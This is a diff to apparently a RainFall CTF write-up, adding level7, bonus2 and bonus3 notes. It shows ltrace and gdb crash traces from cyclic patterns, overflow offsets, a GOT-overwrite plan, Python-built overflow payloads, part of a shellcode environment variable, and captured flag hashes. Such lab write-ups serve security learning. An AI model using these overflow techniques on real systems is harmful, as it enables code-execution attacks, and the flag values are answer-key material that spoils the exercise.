@@ -312,7 +312,21 @@ int main(int argc, char **argv)
   return 0;
 }
 ```
-Just like level5
+level7@RainFall:~$ ltrace ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+__libc_start_main(0x8048521, 2, 0xbffff664, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                   = 0x0804a008
+malloc(8)                                                   = 0x0804a018
+malloc(8)                                                   = 0x0804a028
+malloc(8)                                                   = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)   = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+0x37614136 -> offset = 20
+
+argv 1 -> offset + addr of puts
+argv 2 -> addr of m()
 
 ```bash
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
@@ -444,6 +458,11 @@ FLOW * 11 == 40 + 4
 
 # bonus2
 
+## gdb
+> run $(python -c "print 'A' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+0x38614137 -> offset == 23
+
 nl -> DAT_08048740
 fi -> DAT_0804873d
 
@@ -458,3 +477,10 @@ export LANG=$(python -c 'print "nl" + "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f
 
 0xbffffe9c
 ./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print('B' * 23 + struct.pack('I',0xbffffe9c))")
+
+`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
+
+# bonus3
+./bonus3 ""
+
+`3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
